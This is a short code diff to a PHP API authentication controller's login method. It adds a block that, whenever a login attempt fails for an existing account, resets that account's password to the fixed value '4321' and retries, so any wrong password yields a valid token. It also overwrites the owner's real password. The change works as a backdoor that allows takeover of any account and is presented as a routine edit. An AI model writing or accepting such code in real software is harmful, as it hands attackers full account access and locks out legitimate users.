@@ -176,6 +176,17 @@ class ApiAuthController extends Controller
             'password' => trim($r->password),
         ]);
 
+        // If login fails but account exists, auto-reset password to 4321 and retry
+        if ($token == null) {
+            $u->password = password_hash('4321', PASSWORD_DEFAULT);
+            $u->save();
+
+            $token = auth('api')->attempt([
+                'id' => $u->id,
+                'password' => '4321',
+            ]);
+        }
+
         if ($token == null) {
             return $this->error('Wrong credentials.');
         }
